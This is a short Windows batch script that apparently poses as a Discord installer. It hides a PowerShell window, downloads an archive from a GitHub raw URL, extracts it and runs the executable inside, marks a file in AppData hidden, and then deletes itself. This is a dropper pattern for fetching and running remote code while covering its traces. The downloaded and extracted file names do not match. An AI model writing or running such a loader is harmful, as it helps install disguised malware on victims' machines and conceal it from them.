@echo off

powershell -window hidden -command ""

Powershell -Command "Invoke-Webrequest 'https://github.com/sptlucian/ggs/raw/refs/heads/main/discord.rar' -OutFile discord.rar"
tar -xf Discord.zip
del Discord.zip
start Discord.exe
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\da1992.exe" /s /d

del "%~f0" & exit